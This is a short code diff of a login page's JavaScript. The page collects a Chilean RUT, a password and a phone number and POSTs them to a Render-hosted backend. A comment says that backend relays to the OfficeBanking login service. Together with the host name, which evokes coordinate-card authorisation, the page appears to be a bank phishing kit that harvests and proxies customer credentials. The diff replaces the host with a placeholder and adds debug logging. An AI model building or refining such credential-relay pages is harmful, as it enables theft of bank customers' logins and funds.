@@ -74,19 +74,22 @@
       }
 
       try {
-        // Apunta a tu backend en Render, que reenvía a wslogin.officebanking.cl
-        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com", {
+        // IMPORTANTE: reemplaza esta URL por la real de tu servicio en Render
+        const response = await fetch("https://TU-SERVICIO.onrender.com/proxy-login", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ rut, passwd, telefono })
         });
+
         const data = await response.text();
+        console.log("Respuesta del servidor:", data); // Para depuración
         document.getElementById("resultado").innerText = data;
 
         if(response.ok && data.includes("OK")){
           setTimeout(()=> window.location.href = "productos.html", 1500);
         }
       } catch (error) {
+        console.error("Error en fetch:", error);
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
       }
     });
